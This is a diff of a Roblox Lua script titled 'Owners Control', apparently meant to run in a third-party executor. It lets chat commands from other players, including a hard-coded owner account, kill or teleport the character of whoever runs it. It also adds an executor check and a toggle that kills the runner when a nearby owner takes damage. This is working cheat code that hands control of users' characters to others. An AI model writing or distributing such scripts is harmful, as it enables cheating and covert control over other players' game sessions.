@@ -1,3 +1,4 @@
+-- Owners Control --
 local ws, plrs, reps, rs, txs
 ws = game:GetService("Workspace")
 plrs = game:GetService("Players")
@@ -8,7 +9,7 @@ txs = game:GetService("TextChatService")
 local vars, plr
 vars = {
   chatv = txs.ChatVersion == Enum.ChatVersion.LegacyChatService,
-  s_des = false, s_cal = false,
+  s_des = false, s_cal = false, prefix = "/",
   owners = {"bloxfruits_devs09"}
 }
 plr = plrs.LocalPlayer
@@ -19,6 +20,10 @@ function ntfc(m) m = tostring(m)
   else
     reps.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m, "All")
   end
+end
+
+function str_check(t, n)
+  return t == vars.prefix..n
 end
 
 function rcv_hrp(t)
@@ -49,17 +54,19 @@ function do_cmd(t, n) print(t, n)
   local t = {hrp = rcv_hrp(t), hmoid = rcv_hmoid(t), alive = t_alive(t)}
   local s = {hrp = rcv_hrp(plr), hmoid = rcv_hmoid(plr), alive = t_alive(plr)}
   if table.find(vars.owners, plr.Name:lower()) then return end
-  if n == "/rs" then
+  if str_check(n, "rs") then
     if s.hmoid and s.alive then s.hmoid.Health = 0 end
-  elseif n == "/br" then
+  elseif str_check(n, "br") then
     if s.hrp and s.alive and t.hrp and t.alive then
       s.hrp.CFrame = CFrame.new(t.hrp.Position + (t.hrp.CFrame.LookVector * 5))
     end
-  elseif n == "/dps" then
+  elseif str_check(n, "dps") then
     vars.s_des = not vars.s_des
     ntfc(vars.s_des)
-  elseif n == "/cmds" then
-    ntfc("prefix:\"/\", rs, br, dps")
+  elseif str_check(n, "idt") then
+    if identifyexecutor then ntfc(tostring(identifyexecutor())) else ntfc("api doesn't exist...") end
+  elseif str_check(n, "cmds") then
+    ntfc("prefix:\""..vars.prefix.."\", rs, br, dps")
   end
 end
 
@@ -69,24 +76,22 @@ function do_connect(t)
   end)
 end
 
-for _, user in next, plrs:GetPlayers() do
-  if user then do_connect(user) end
-end
-
+for _, user in next, plrs:GetPlayers() do if user then do_connect(user) end end
 plrs.PlayerAdded:Connect(function(t) if t then do_connect(t) end end)
 
 rs.RenderStepped:Connect(function()
   local near = nearby_t()
   if near and vars.s_des then
+    if not table.find(vars.owners, near.Name:lower()) then return end
     if not vars.s_cal then vars.s_cal = true
       local t_hmoid, s_hmoid = rcv_hmoid(near), rcv_hmoid(plr)
       if t_hmoid and s_hmoid then
         local hp = t_hmoid.Health
-        task.wait(0.5)
+        task.wait(0.85)
         if hp > t_hmoid.Health then
           s_hmoid.Health = 0
         end
-      end
+      end vars.s_cal = false
     end
   end
 end)
